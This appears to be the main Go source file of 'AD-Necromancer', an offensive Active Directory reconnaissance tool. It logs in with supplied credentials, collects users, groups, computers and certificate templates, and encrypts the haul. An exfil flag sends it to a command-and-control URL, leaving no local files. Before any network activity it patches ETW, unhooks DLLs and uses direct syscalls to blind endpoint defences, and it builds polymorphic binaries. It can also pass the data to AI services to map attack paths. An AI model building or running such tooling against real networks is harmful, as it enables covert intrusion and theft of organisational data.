//go:build windows

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"ad-necromancer/internal/ai"
	"ad-necromancer/internal/bh"
	"ad-necromancer/internal/bloodhound"
	"ad-necromancer/internal/claude"
	"ad-necromancer/internal/collector"
	"ad-necromancer/internal/crypto"
	"ad-necromancer/internal/deepseek"
	"ad-necromancer/internal/evasion"
	"ad-necromancer/internal/exfil"
	"ad-necromancer/internal/gemini"
	"ad-necromancer/internal/necromancy"
	"ad-necromancer/internal/ollama"
	"ad-necromancer/internal/openai"
	_ "ad-necromancer/internal/phantom" // embed random pad + BuildID for polymorphic hashing
	"ad-necromancer/internal/privacy"
	"ad-necromancer/internal/prompts"
)

// ANSI Color Codes
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
	ColorOrange = "\033[38;5;208m"
	ColorBold   = "\033[1m"
	ColorDim    = "\033[2m"
	ColorWhite  = "\033[97m"
)

const lineW = "─────────────────────────────────────────────────────────────────────────────────"

func sep(color string) { fmt.Println(color + lineW + ColorReset) }
func step(icon, label, detail string) {
	fmt.Printf("  %s  %-28s %s%s%s\n", icon, label, ColorCyan, detail, ColorReset)
}
func ok(msg string)   { fmt.Printf("  %s✔%s  %s\n", ColorGreen, ColorReset, msg) }
func warn(msg string) { fmt.Printf("  %s⚠%s  %s%s%s\n", ColorYellow, ColorReset, ColorYellow, msg, ColorReset) }
func fail(msg string) { fmt.Printf("  %s✖%s  %s%s%s\n", ColorRed, ColorReset, ColorRed, msg, ColorReset) }

func main() {
	// ---- Flags ----
	var (
		// Collection
		username string
		domain   string
		password string
		dc       string
		method   string

		// Legacy: offline JSON analysis mode
		dataDir    string
		sampleSize int

		// Output
		localMode  bool
		exfilURL   string

		// Analysis (AI)
		analyze     bool
		useOpenAI   bool
		useGemini   bool
		useClaude   bool
		onPremise   bool

		// Evasion
		stealth   bool
		noUnhook  bool
		noETWPatch bool

		// Privacy
		noPrivacyCloak bool
		saveMapping    bool
		debugMode      bool
	)

	// Collection flags
	flag.StringVar(&username, "u", "", "AD username")
	flag.StringVar(&username, "username", "", "AD username (long form)")
	flag.StringVar(&domain, "d", "", "AD domain FQDN (e.g. corp.local)")
	flag.StringVar(&domain, "domain", "", "AD domain FQDN (long form)")
	flag.StringVar(&password, "p", "", "AD password")
	flag.StringVar(&password, "password", "", "AD password (long form)")
	flag.StringVar(&dc, "dc", "", "Domain controller hostname/IP (optional, auto-discovers)")
	flag.StringVar(&method, "method", "auto", "Collection method: adws | ldap | auto")

	// Legacy offline mode
	flag.StringVar(&dataDir, "data", "", "Offline mode: path to BloodHound JSON files directory")
	flag.IntVar(&sampleSize, "sample-size", 20, "AI entity sample size")

	// Output flags
	flag.BoolVar(&localMode, "local", true, "Save encrypted adn_data.zip locally")
	flag.StringVar(&exfilURL, "exfil", "", "HTTPS C2 URL for encrypted zip upload")

	// Analysis flags
	flag.BoolVar(&analyze, "analyze", false, "Run AI necromancy analysis on collected data")
	flag.BoolVar(&useOpenAI, "openai", false, "Use OpenAI backend")
	flag.BoolVar(&useGemini, "gemini", false, "Use Gemini backend")
	flag.BoolVar(&useClaude, "claude", false, "Use Claude backend")
	flag.BoolVar(&onPremise, "on-premise", false, "Use Ollama (local) backend")

	// Evasion flags
	flag.BoolVar(&stealth, "stealth", false, "Enable maximum evasion + minimal logging")
	flag.BoolVar(&noUnhook, "no-unhook", false, "Disable DLL unhooking (debug)")
	flag.BoolVar(&noETWPatch, "no-etw-patch", false, "Disable ETW patching (debug)")

	// Privacy flags
	flag.BoolVar(&noPrivacyCloak, "no-privacy-cloak", false, "Disable privacy tokenization")
	flag.BoolVar(&saveMapping, "save-mapping", false, "Save tokenization mapping to disk")
	flag.BoolVar(&debugMode, "debug", false, "Show AI payload (verify Privacy Cloak)")

	flag.Parse()

	// ---- Phase 0: Evasion Bootstrap ----
	// Run ASAP — before any network ops, any prints in stealth mode.
	evasion.Bootstrap(noUnhook, noETWPatch)

	// ---- Banner ----
	if !stealth {
		printBannerV2()
	}

	// ---- Determine mode ----
	offlineMode := dataDir != ""
	liveMode := domain != "" && username != "" && password != ""

	if !offlineMode && !liveMode {
		if !stealth {
			fmt.Println(ColorRed + "[!] Provide credentials (-u/-d/-p) for live collection, or --data for offline analysis." + ColorReset)
		}
		flag.Usage()
		os.Exit(1)
	}

	// ---- Phase 1: Data Collection ----
	var adData *bh.ADData

	if liveMode {
		if !stealth {
			sep(ColorRed)
			step("☠", "TARGET", fmt.Sprintf("%s@%s", username, domain))
			step("⚡", "METHOD", strings.ToUpper(method))
			sep(ColorRed)
			fmt.Println()
			step("◈", "PHASE 1  Collecting AD data...", "")
		}

		cfg := collector.Config{
			Domain:   domain,
			DC:       dc,
			Username: username,
			Password: password,
			Method:   collector.Method(method),
			Stealth:  stealth,
		}

		var err error
		adData, err = collector.Collect(cfg)
		if err != nil {
			if !stealth { fail("Collection failed: " + err.Error()) }
			log.Fatalf("", err)
		}

		if !stealth {
			printCollection(
				len(adData.Users), len(adData.Groups), len(adData.Computers),
				len(adData.Domains), len(adData.GPOs), len(adData.OUs),
				len(adData.CertTemplates), len(adData.EnterpriseCAs),
			)
		}

		// ---- Phase 2: Format to BloodHound CE v6 JSON ----
		if !stealth { step("◈", "PHASE 2  Formatting BloodHound JSON...", "") }
		formatter := bh.NewFormatter(adData)
		files, err := formatter.FormatAll()
		if err != nil {
			if !stealth { fail("BH format failed: " + err.Error()) }
			log.Fatalf("", err)
		}

		// ---- Phase 3: AES-256-GCM Encrypt + Zip ----
		if !stealth { step("◈", "PHASE 3  Encrypting payload...", "AES-256-GCM") }
		ez, err := crypto.BuildEncryptedZip(files)
		if err != nil {
			if !stealth { fail("Crypto failed: " + err.Error()) }
			log.Fatalf("", err)
		}

		// ---- Phase 4: Exfil ----
		// When --exfil is set, data goes straight to C2 — no local artifacts.
		saveLocal := localMode && exfilURL == ""

		if saveLocal {
			if err := exfil.SaveLocal(ez, "adn_data.zip"); err != nil {
				if !stealth { fail("Save failed: " + err.Error()) }
				log.Fatalf("", err)
			}
			keyFile := exfil.KeyFileName()
			if err := exfil.SaveKey(ez, keyFile); err != nil {
				fmt.Printf(ColorRed+"  ✖  CRITICAL: key file save failed: %v\n"+ColorReset, err)
			} else if stealth {
				fmt.Printf("[key]→%s\n", keyFile)
			} else {
				printKeyBox(keyFile)
			}
		}

		if exfilURL != "" {
			if !stealth {
				fmt.Println()
				step("◈", "PHASE 4  Transmitting to C2...", exfilURL)
			}
			if err := exfil.UploadHTTPS(ez, exfilURL); err != nil {
				if !stealth { fail("Exfil failed: " + err.Error()) }
			} else if !stealth {
				ok("Payload delivered to C2 — no local artifacts.")
			}
		}
	}

	if !stealth && liveMode {
		fmt.Println()
		sep(ColorRed)
		fmt.Printf("  %s☠%s  %sThe dead have spoken.%s\n", ColorRed, ColorReset, ColorBold, ColorReset)
		sep(ColorRed)
		fmt.Println()
	}
	if stealth && liveMode {
		fmt.Println("[ok] edr_asleep")
	}

	// ---- Phase 5: AI Necromancy Analysis (optional --analyze flag) ----
	if analyze {
		if !stealth {
			fmt.Println(ColorPurple + "\n[*] Initiating Necromancy ritual..." + ColorReset)
		}

		// Build the old bloodhound.Loader-compatible data from adData or offline files
		var loader *bloodhound.Loader
		if offlineMode {
			loader = bloodhound.NewLoader()
			if err := loader.LoadFromDirectory(dataDir); err != nil {
				log.Fatalf(ColorRed+"[!] Failed to load data: %v"+ColorReset, err)
			}
		} else if adData != nil {
			// Convert collected bh.ADData back to bloodhound.BloodHoundData for the existing engine
			loader = adDataToLoader(adData)
		}

		// Initialize AI backend
		var aiClient ai.AIClient
		var err error
		if onPremise {
			aiClient, err = ollama.NewClient()
		} else if useClaude {
			aiClient, err = claude.NewClient()
		} else if useGemini {
			aiClient, err = gemini.NewClient()
		} else if useOpenAI {
			aiClient, err = openai.NewClient()
		} else {
			aiClient, err = deepseek.NewClient()
		}
		if err != nil {
			log.Fatalf(ColorRed+"[!] AI backend init failed: %v"+ColorReset, err)
		}

		// Privacy cloak
		var tokenizer *privacy.Tokenizer
		cloakEnabled := !noPrivacyCloak && !onPremise
		if cloakEnabled {
			tokenizer = privacy.NewTokenizer()
			if !stealth {
				fmt.Println(ColorGreen + "[🔒] Privacy Cloak: ENABLED" + ColorReset)
			}
		}

		engine := necromancy.NewEngine(loader, aiClient)
		engine.Tokenizer = tokenizer
		engine.CloakEnabled = cloakEnabled
		engine.DebugMode = debugMode

		paths, err := engine.ResurrectWithSampleSize(sampleSize)
		if err != nil {
			log.Fatalf(ColorRed+"[!] Necromancy failed: %v"+ColorReset, err)
		}

		if !stealth {
			printPaths(paths)
		}

		// Save prompt used for reference
		_ = prompts.NecromancerSystemPrompt

		// Save mapping if requested
		if saveMapping && cloakEnabled && tokenizer != nil {
			runID := privacy.GenerateRunID()
			if err := tokenizer.SaveMapping(runID); err != nil {
				fmt.Printf(ColorYellow+"[!] Failed to save mapping: %v\n"+ColorReset, err)
			}
		}
	}

	if !stealth {
		fmt.Println(ColorPurple + "\n[💀] The dead have spoken." + ColorReset)
	}
}

// adDataToLoader converts collected bh.ADData into a bloodhound.Loader for the AI engine.
func adDataToLoader(data *bh.ADData) *bloodhound.Loader {
	loader := bloodhound.NewLoader()

	toNodes := func(nodes []bh.Node) []bloodhound.Node {
		out := make([]bloodhound.Node, 0, len(nodes))
		for _, n := range nodes {
			out = append(out, bloodhound.Node{
				ObjectIdentifier: n.ObjectIdentifier,
				Properties: bloodhound.Properties{
					Name:              n.Properties.Name,
					Domain:            n.Properties.Domain,
					Description:       n.Properties.Description,
					DistinguishedName: n.Properties.DistinguishedName,
					HighValue:         n.Properties.HighValue,
					AdminCount:        n.Properties.AdminCount,
					Enabled:           n.Properties.Enabled,
					PasswordLastSet:   n.Properties.PasswordLastSet,
					OperatingSystem:   n.Properties.OperatingSystem,
				},
			})
		}
		return out
	}

	loader.Data.Users = toNodes(data.Users)
	loader.Data.Groups = toNodes(data.Groups)
	loader.Data.Computers = toNodes(data.Computers)
	loader.Data.Domains = toNodes(data.Domains)
	loader.Data.GPOs = toNodes(data.GPOs)
	loader.Data.OUs = toNodes(data.OUs)
	loader.Data.CertTemplates = toNodes(data.CertTemplates)
	loader.Data.EnterpriseCAs = toNodes(data.EnterpriseCAs)

	return loader
}

func printBannerV2() {
	fmt.Println()
	sep(ColorRed)
	fmt.Println(ColorRed + ColorBold +
		"  ☠  AD-NECROMANCER  v2" + ColorReset +
		ColorDim + "  ·  Privilege Archaeology Engine  ·  DEFCON Research Edition" + ColorReset)
	sep(ColorRed)
	fmt.Println()
	fmt.Printf("  %s%-14s%s %s\n", ColorDim, "EVASION",  ColorReset, ColorCyan+"ETW patch · DLL unhook · Direct syscalls (Halos Gate)"+ColorReset)
	fmt.Printf("  %s%-14s%s %s\n", ColorDim, "PROTOCOL", ColorReset, ColorCyan+"ADWS-First (MC-NMF/NTLM)  →  LDAP Ghosting fallback"+ColorReset)
	fmt.Printf("  %s%-14s%s %s\n", ColorDim, "OUTPUT",   ColorReset, ColorCyan+"AES-256-GCM encrypted zip  ·  key never printed"+ColorReset)
	fmt.Printf("  %s%-14s%s %s\n", ColorDim, "MOTTO",    ColorReset, ColorPurple+`"Humans forget. Directories do not."`+ColorReset)
	fmt.Println()
	sep(ColorRed)
	fmt.Println()
}

func printCollection(u, g, c, d, gpo, ou, ct, ca int) {
	fmt.Println()
	sep(ColorGreen)
	fmt.Printf("  %s✔%s  COLLECTION COMPLETE\n", ColorGreen, ColorReset)
	sep(ColorGreen)
	printRow := func(label string, count int) {
		bar := ""
		for i := 0; i < count && i < 40; i++ { bar += "█" }
		if count > 40 { bar += "…" }
		fmt.Printf("  %-14s %s%4d%s  %s%s%s\n",
			label, ColorWhite, count, ColorReset, ColorDim, bar, ColorReset)
	}
	printRow("Users",        u)
	printRow("Groups",       g)
	printRow("Computers",    c)
	printRow("Domains",      d)
	printRow("GPOs",         gpo)
	printRow("OUs",          ou)
	printRow("CertTemplates",ct)
	printRow("EnterpriseCAs",ca)
	sep(ColorGreen)
	fmt.Println()
}

func printPaths(paths []necromancy.ZombiePath) {
	for _, p := range paths {
		riskColor := ColorGreen
		switch p.Probability {
		case "Critical":
			riskColor = ColorRed
		case "High":
			riskColor = ColorOrange
		case "Medium":
			riskColor = ColorYellow
		}
		fmt.Println(ColorRed + "╔══════════════════════════════════════════════════════════════════════════════╗" + ColorReset)
		fmt.Printf(ColorRed+"║ %s☠  %-74s%s║\n"+ColorReset, riskColor, p.Probability+" — "+p.Title, ColorRed)
		fmt.Println(ColorRed + "╚══════════════════════════════════════════════════════════════════════════════╝" + ColorReset)

		if p.EntityName != "" {
			fmt.Printf(ColorCyan+"[ENTITY]"+ColorReset+" %s%s%s (%s)\n", ColorPurple, p.EntityName, ColorReset, p.EntityType)
		}
		if p.Reasoning != "" {
			fmt.Println(ColorCyan + "[SECURITY INTERPRETATION]" + ColorReset)
			for _, line := range splitBullets(p.Reasoning) {
				fmt.Printf("  ▸ %s\n", line)
			}
		}
		if p.VisualPath != "" {
			fmt.Println(ColorCyan + "[UNDEAD CONTROL PATH]" + ColorReset)
			fmt.Println(p.VisualPath)
		}
		if len(p.ExecutionVectors) > 0 {
			fmt.Println(ColorCyan + "[EXECUTION VECTORS]" + ColorReset)
			for _, v := range p.ExecutionVectors {
				fmt.Printf("  • %s\n", v)
			}
		}
		if p.Mitigation != "" {
			fmt.Println(ColorGreen + "[MITIGATION]" + ColorReset)
			fmt.Printf("  %s\n", p.Mitigation)
		}
		fmt.Println(ColorCyan + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" + ColorReset)
		fmt.Println()
	}
}

func splitBullets(text string) []string {
	if strings.Contains(text, "\n") {
		var out []string
		for _, l := range strings.Split(text, "\n") {
			l = strings.TrimSpace(l)
			if l != "" {
				out = append(out, l)
			}
		}
		return out
	}
	return []string{text}
}

// printKeyBox prints a clean notification that the key has been saved.
// The actual key hex is NEVER displayed — only the filename.
func printKeyBox(keyFile string) {
	fmt.Println()
	sep(ColorGreen)
	ok("ENCRYPTED DATA SAVED LOCALLY")
	sep(ColorGreen)
	fmt.Printf("  %-14s %s%s%s\n", "Payload",  ColorYellow, "adn_data.zip  (AES-256-GCM)", ColorReset)
	fmt.Printf("  %-14s %s%s%s\n", "Key file", ColorYellow, keyFile, ColorReset)
	fmt.Println()
	warn("Keep this key safe — it will NOT be stored anywhere else.")
	sep(ColorGreen)
	fmt.Println()
}
